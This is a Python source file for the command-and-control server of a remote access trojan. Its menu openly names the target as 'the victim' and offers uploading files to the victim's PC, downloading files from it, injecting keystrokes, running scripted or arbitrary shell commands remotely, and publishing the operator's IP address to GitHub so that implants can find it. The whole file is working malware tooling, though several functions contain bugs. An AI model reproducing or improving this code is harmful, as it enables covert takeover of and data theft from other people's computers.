import socket,time,psutil,colorama,os,subprocess
from pynput.keyboard import Listener
from colorama import Fore,Back,Style

colorama.init()
string = ''



def header(HOST,PORT):
	print(Fore.CYAN+Style.BRIGHT+f'server started at {HOST}:{PORT}')
	print(Fore.RED+Style.BRIGHT+"""main commands:
----------------
1)send binary file     --> to send binary files like images/videos/executables etc to vivtim's pc
2)send text file       --> to send text files like python files/csv's etc to victims pc
3)recieve binary file  --> to download binary files from victim's pc
4)recieve text file    --> to download text files from victim's pc
5)keyboard access      --> gives controll of the victim's keyboard
6)script_mode          --> to run commands stored in a text file
7)<any terminal commands>
8)exit""")
	print(Fore.CYAN+Style.BRIGHT)


def get_ip_addresses():
	family = socket.AF_INET
	for interface, snics in psutil.net_if_addrs().items():
		for snic in snics:
			if snic.family == family and interface=='wlp2s0':
				return snic.address


def update_ip(HOST,PORT):
	if 'ip' not in os.listdir():
		os.mkdir('ip')
		os.chdir('ip')
		subprocess.run('git init',shell=True)
		subprocess.run('git remote add origin git@github.com:indrajith69/server_address.git',shell=True)
		subprocess.run('git branch -M master',shell=True)
		os.chdir('..')

	os.chdir('ip')
	ip_address=str(HOST)+':'+str(PORT)

	with open('ip_address.txt','w') as f:
		f.write(ip_address)

	subprocess.run('git add ip_address.txt',shell=True)
	subprocess.run("git commit -m 'n ip'",shell=True)
	subprocess.run('git push origin --delete master',shell=True)
	subprocess.run('git push origin master',shell=True)

	os.chdir('..')


def script_mode():
	path = input("enter the path : ")
	with open(path,'r') as f:
		for line in f.readlines():
			if line[:2]=="t#":
				time.sleep(int(line[2:]))
			else:
				client.send(line.encode('utf-8'))
				print()
				print(client.recv(1024).decode('utf-8'))


def send_b_file(size=1024):
	path = input('enter the path of the file : ')
	name = input('enter the name for the file : ')
	client.send(name.encode('utf-8'))
	file = open(path,'rb')

	file_contents = file.read(size)
	file_contents=bytearray(file_contents)

	while len(file_contents)>0:
		try:
			client.send(file_contents)
			file_contents = file.read(size)
			file_contents=bytearray(file_contents)
			client.recv(1024).decode('utf-8')
		except Exception as err:
			print(err)

	file.close()
	print('done')


def recv_b_file(size=1024):
	path = input('enter the path of the file : ')
	name = input('enter the name for the file : ')
	client.send(path.encode('utf-8'))


	with open(name,'wb') as f:
		while True:
			file_contents = client.recv(size)

			if not file_contents:
				break
			else:
				f.write(file_contents)

			client.send('s'.encode('utf-8'))
	print('done')



def send_t_file(size=1024):
	file = input('enter the path of the file : ')
	name = input('enter the name for the file : ')

	f=open(file,'r')

	file_contents = file.read(size)

	while len(file_contents)>0:
		try:
			client.send(file_contents).encode('utf-8')
			file_contents = file.read(size)
			client.recv(1024).decode('utf-8')
		except Exception as err:
			print(err)

	f.close()
	print('done')


def recv_t_file(size=1024):
	path = input('enter the path of the file : ')
	name = input('enter the name for the file : ')
	client.send(path.encode('utf-8'))


	with open(name,'w') as f:
		while True:
			file_contents = client.recv(size).decode('utf-8')

			if not file_contents:
				break
			else:
				f.write(file_contents)

			client.send('s'.encode('utf-8'))
	print('done')







def keyboard(size=1024):
	option=input('enter ur choice:\n1)from a file\n2)live\noption : ')
	client.send(option.encode('utf-8'))
	if option=='1':
		file=input('enter the path of the file : ')
		f=open(file,'r')
		file_contents = file.read(size)

		while len(file_contents)>0:
			try:
				client.send(file_contents).encode('utf-8')
				file_contents = file.read(size)
				client.recv(1024).decode('utf-8')
			except Exception as err:
				print(err)

		file.close()
		print('done')


	elif option=='2':
		def send_keystrokes(key):
			key = str(key)
			global string

			if key=='Key.enter':
				if string=='exit':
					client.send(string.encode('utf-8'))
					print(client.recv(size).decode('utf-8'))
					return
				else:
					string=string+'\n'
					client.send(string.encode('utf-8'))
					string=''

			elif key=='Key.space':
				string+=' '
	
			elif 'Key' in key:
				pass

			else:
				string+=key.replace("'","")

		with Listener(on_press=send_keystrokes) as l:
			l.join()
	else:
		print('invalid choice')









def server(PORT=5050):
	global client
	HOST = get_ip_addresses()
	PORT = PORT

	header(HOST,PORT)
	update_ip(HOST,PORT)

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((HOST, PORT))
					
	server.listen()

	print('\n\n\nserver started\n\nwaiting for a connection')
	client,address = server.accept()
	print(f'connected to {address}\n')

	while True:
		try:
			command = input('Enter a command : ')


			if command=='send binary file':
				client.send(command.encode('utf-8'))
				send_b_file(102400)

			elif command=='send text file':
				client.send(command.encode('utf-8'))
				send_t_file(102400)

			elif command=='recieve binary file':
				client.send(command.encode('utf-8'))
				recv_b_file(102400)

			elif command=='recieve text file':
				client.send(command.encode('utf-8'))
				send_t_file(102400)




			elif command=='keyboard access':
				client.send(command.encode('utf-8'))
				keyboard()

			elif command=='script mode':
				script_mode()


			elif command=='exit':
				break


			else:
				client.send(command.encode('utf-8'))
				print()
				print(client.recv(1024).decode('utf-8'))


		except Exception as error:
			print(error)




server(9099)
#header('192.168.18.3',9090)